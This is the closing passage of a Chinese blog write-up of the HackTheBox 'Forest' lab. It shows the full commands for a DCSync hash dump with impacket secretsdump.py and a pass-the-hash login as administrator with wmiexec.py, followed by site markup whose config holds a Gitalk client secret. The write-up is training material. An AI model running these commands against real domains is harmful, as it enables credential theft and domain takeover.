+<p>之前我们已经创建了一个有<code>DCSync</code>权限的用户，我们可以使用<code>secretsdump.py</code>工具执行 <code>DCSync</code> 以转储管理员用户的 <code>NTLM</code> 哈希</p>
+<p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py popayw:'123abc!'@10.10.10.161</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704150548072-705369653.png" alt="image-20240704150539216"></p>
+<p>可以看到已经拿到所有用户的<code>hash</code>，包括<code>admin</code>用户的</p>
+<h2 id="pth传递攻击获取root">
+<a class="header-anchor" href="#pth%e4%bc%a0%e9%80%92%e6%94%bb%e5%87%bb%e8%8e%b7%e5%8f%96root"></a>
+PTH传递攻击获取Root
+</h2><p>拿到了管理员的<code>hash</code>，就可以通过<code>wmiexec</code>哈希传递拿到管理员用户的权限</p>
+<p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704151153151-1244754650.png" alt="image-20240704151145045"></p>
+<p>成功拿到管理员用户的权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704151425592-732615984.png" alt="image-20240704151417342"></p>
+<p>最后也是在<code>desktop</code>获取<code>root.txt</code></p></div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/windows"
+        rel="tag"
+        >WINDOWS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/as-rep-roasting"
+        rel="tag"
+        >AS-REP ROASTING</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/dcsync"
+        rel="tag"
+        >DCSYNC</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_9.webp"
+              data-sizes="auto"
+              alt="CISCN2024"
+              class="lazyload"
+            /><a
+          href="/post/ciscn2024/"
+          aria-label="前一篇:CISCN2024"
+          title="前一篇:CISCN2024"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">CISCN2024</h3>
+      </div><div class="article-nav-link-wrap right"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_107.webp"
+              data-sizes="auto"
+              alt="HTB Sauna"
+              class="lazyload"
+            /><a
+          href="/post/htb-sauna/"
+          aria-label="后一篇:HTB Sauna"
+          title="后一篇:HTB Sauna"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">HTB Sauna</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Ya1orin
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;97.1k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:38</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a>
+      <ul>
+        <li><a href="#nmap扫描">nmap扫描</a></li>
+        <li><a href="#smb">SMB</a></li>
+        <li><a href="#ldap">LDAP</a></li>
+        <li><a href="#rpc">RPC</a></li>
+      </ul>
+    </li>
+    <li><a href="#as-rep-roasting">AS-REP Roasting</a></li>
+    <li><a href="#ad域渗透权限提升">AD域渗透权限提升</a>
+      <ul>
+        <li><a href="#bloodhound信息搜集">BloodHound信息搜集</a></li>
+        <li><a href="#信息分析">信息分析</a></li>
+        <li><a href="#创建一个恶意用户">创建一个恶意用户</a></li>
+        <li><a href="#dcsync攻击导出域内哈希">DCSync攻击导出域内哈希</a></li>
+        <li><a href="#pth传递攻击获取root">PTH传递攻击获取Root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "G5DS5ZI3YM",
+        apiKey: "90bf1b7c38d7240c582e5c8a29bff9ab",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+    if (window.firework) {
+      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+      options.excludeElements = options.excludeelements;
+      delete options.excludeelements;
+      window.firework(options);
+    }
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Ya1orin",
+          title: "HTB Forest",
+          url: "http:\/\/localhost:1313\/post\/htb-forest\/",
+          description: "HackTheBox篇Active Directory 101系列之Forest",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23li64Bz4egFDpBVAa',
+            clientSecret: 'ff0e7ea9d99ed40adbfcb4bf88ff2b95918d9dd7',
+            repo: 'Blog-comment',
+            owner: 'Ya1orin',
+            admin: JSON.parse("\"Ya1orin\""),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'gitalk';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
+    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
